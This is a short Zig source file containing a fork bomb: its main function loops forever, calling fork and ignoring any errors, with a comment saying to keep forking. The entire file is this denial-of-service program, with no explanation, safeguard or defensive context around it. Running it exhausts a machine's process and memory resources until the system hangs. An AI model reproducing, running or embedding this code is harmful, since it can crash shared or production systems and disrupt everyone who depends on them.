const std = @import("std");

pub fn main() !void {
    while (true) {
        // Ignore the return value/errors and keep forking
        _ = std.posix.fork() catch continue;
    }
}